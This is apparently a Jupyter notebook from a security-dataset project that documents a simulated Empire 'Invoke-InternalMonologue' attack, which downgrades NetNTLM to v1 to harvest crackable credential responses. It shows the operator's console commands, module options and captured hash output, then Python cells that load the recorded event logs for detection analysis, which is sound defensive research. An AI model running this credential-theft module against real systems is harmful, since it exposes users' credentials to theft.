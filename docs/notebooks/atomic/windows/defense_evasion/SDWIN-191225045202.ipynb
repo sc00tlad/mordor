{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7b0576cc",
   "metadata": {},
   "source": [
    "# Empire Invoke InternalMonologue"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ef96f7ec",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ef7c29f9",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/12/25 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1112](https://attack.mitre.org/techniques/T1112) |\n",
    "| Tags              | Registry Modification,Windows Registry NetNTLM settings,Downgrade |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "51f677a3",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries downgrading the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in an environment"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f22a8da5",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "68a62e3a",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e6644aa7",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5d9a8caa",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3abc8c9",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [invoke_internal_monologue](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-InternalMonologue.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e96f7154",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > info\n",
    "\n",
    "            Name: Invoke-InternalMonologue\n",
    "            Module: powershell/credentials/invoke_internal_monologue\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "        Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "@eladshamir\n",
    "@4lex\n",
    "\n",
    "Description:\n",
    "Uses the Internal Monologue attack to force easily-\n",
    "decryptable Net-NTLMv1 responses over localhost and without\n",
    "directly touching LSASS.\n",
    "https://github.com/eladshamir/Internal-Monologue\n",
    "\n",
    "Comments:\n",
    "The underlying powershell function accepts switches that\n",
    "[DISABLE] default behaviours. The default settings will\n",
    "downgrade NetNTLM responses to v1, impersonate all users,\n",
    "use challenge 1122334455667788 and restore the registry to\n",
    "its original state. Set the options in this module to True\n",
    "in order to DISABLE the behaviours Disabling Downgrade and\n",
    "Impersonation yields higher OPSEC, but less than ideal loot\n",
    "\n",
    "Options:\n",
    "\n",
    "Name        Required    Value                     Description\n",
    "----        --------    -------                   -----------\n",
    "Agent       True        XFLEZM9N                  Agent to use for InternalMonologue      \n",
    "Challenge   True        1122334455667788          Net-NTLM Challenge to send              \n",
    "Downgrade   False                                 DISABLE downgrading to allow Net-NTLMv1 \n",
    "                                                    responses                               \n",
    "Impersonate False                                 DISABLE user impersonation and fetch    \n",
    "                                                    only current user                       \n",
    "Restore     False                                 DISABLE restoring the registry setting  \n",
    "                                                    that allowed v1 responses               \n",
    "Verbose     False                                 Verbose                                 \n",
    "\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked XFLEZM9N to run TASK_CMD_WAIT\n",
    "[*] Agent XFLEZM9N tasked with task ID 2\n",
    "[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788\n",
    "IT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d88df951",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afeacefc",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4532729f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "66d9c413",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f61bdb7f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7cf04e4c",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ffb23ab",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0615f790",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
